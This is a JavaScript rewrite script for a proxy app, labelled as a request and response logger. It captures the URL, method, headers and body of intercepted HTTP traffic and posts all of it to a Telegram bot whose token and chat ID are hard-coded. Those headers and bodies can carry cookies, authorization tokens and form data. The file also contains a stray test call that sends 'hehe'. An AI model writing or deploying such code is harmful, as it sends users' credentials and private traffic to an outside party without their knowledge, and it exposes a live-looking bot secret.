
"use strict";

const BOT_TOKEN = "6483803951:AAECh9K5XEWdTxPh3gRz6KoN7CrCQdapAxU";
const CHAT_ID = "1451946104";

const TELEGRAM_API =
  "https://api.telegram.org/bot" +
  BOT_TOKEN +
  "/sendMessage";

const MAX_MESSAGE_LENGTH = 4090;

// ========================================
// UTILS
// ========================================

function stringify(value) {
  if (value === undefined || value === null) {
    return "(empty)";
  }

  if (typeof value === "string") {
    return value;
  }

  try {
    return JSON.stringify(value, null, 2);
  } catch (e) {
    return String(value);
  }
}

function getHeaders(headers) {
  return stringify(headers || {});
}

function getBody(body) {
  if (body === undefined || body === null || body === "") {
    return "(empty)";
  }

  return stringify(body);
}

function getTime() {
  return new Date().toISOString();
}

// ========================================
// TELEGRAM
// ========================================

function splitMessage(message, maxLength) {
  const chunks = [];

  for (let i = 0; i < message.length; i += maxLength) {
    chunks.push(message.substring(i, i + maxLength));
  }

  return chunks.length ? chunks : ["(empty)"];
}

function sendTelegram(message) {
  if (
    !BOT_TOKEN ||
    !CHAT_ID ||
    BOT_TOKEN === "YOUR_BOT_TOKEN" ||
    CHAT_ID === "YOUR_CHAT_ID"
  ) {
    $done({});
    return;
  }

  const chunks = splitMessage(
    message,
    MAX_MESSAGE_LENGTH
  );

  function sendNext(index) {
    if (index >= chunks.length) {
      $done({});
      return;
    }

    const payload = {
      chat_id: CHAT_ID,
      text: chunks.length > 1
        ? "[" + (index + 1) + "/" + chunks.length + "]\n" + chunks[index]
        : chunks[index],
      disable_web_page_preview: true
    };

    $httpClient.post({
      url: TELEGRAM_API,
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }, function(error, response, data) {
      // Continue even if Telegram returns an error.
      sendNext(index + 1);
    });
  }

  sendNext(0);
}
  sendTelegram('hehe');
// ========================================
// REQUEST LOGGER
// ========================================

function logRequest(req) {
  const message = [
    "📤 HTTP REQUEST",
    "==============================",
    "",
    "TIME: " + getTime(),
    "URL: " + (req.url || ""),
    "METHOD: " + (req.method || ""),
    "",
    "REQUEST HEADERS:",
    getHeaders(req.headers),
    "",
    "REQUEST BODY:",
    getBody(req.body),
    "",
    "=============================="
  ].join("\n");

  sendTelegram(message);
}

// ========================================
// RESPONSE LOGGER
// ========================================

function logResponse(req, res) {
  const message = [
    "📥 HTTP RESPONSE",
    "==============================",
    "",
    "TIME: " + getTime(),
    "URL: " + (req.url || ""),
    "METHOD: " + (req.method || ""),
    "STATUS: " + (
      res.status ||
      res.statusCode ||
      ""
    ),
    "",
    "RESPONSE HEADERS:",
    getHeaders(res.headers),
    "",
    "RESPONSE BODY:",
    getBody(res.body),
    "",
    "=============================="
  ].join("\n");

  sendTelegram(message);
}

// ========================================
// MAIN
// ========================================

if (typeof $response !== "undefined" && $response) {
  // HTTP RESPONSE
  logResponse(
    $request || {},
    $response
  );
} else {
  // HTTP REQUEST
  logRequest(
    $request || {}
  );
}
